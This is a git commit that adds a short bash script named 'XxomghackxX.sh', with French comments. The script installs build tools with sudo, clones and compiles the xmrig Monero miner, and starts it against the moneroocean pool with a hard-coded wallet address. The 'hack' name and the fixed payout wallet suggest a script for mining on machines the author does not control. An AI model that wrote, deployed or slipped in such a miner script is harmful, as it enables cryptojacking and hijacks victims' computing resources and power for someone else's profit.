2466b834cc9955a29d4fce6c14789c63e53d9ada
plg <pierre-louis.garnerone@epita.fr>
2024-04-18 11:00:47 -0400

    Create XxomghackxX.sh

---
+++ XxomghackxX.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+# Installer les dépendances
+sudo apt-get update
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+
+# Cloner le référentiel xmrig
+git clone https://github.com/xmrig/xmrig.git
+
+# Créer un répertoire build et y accéder
+mkdir xmrig/build && cd xmrig/build
+
+# Configurer le processus de construction
+cmake ..
+
+# Construire le logiciel
+make -j4
+
+# Exécuter xmrig
+xmrig -o gulf.moneroocean.stream:10128 -u 469gA6GVNjqQPbu5afzHWCerrbDMnGRkvQwMRuxAt6x9WRP5wbLbf5JEp8RjA37ghPdBLX6Q2jJ1a7C3dMDEJxzwBY2qNi9 -p raspberry
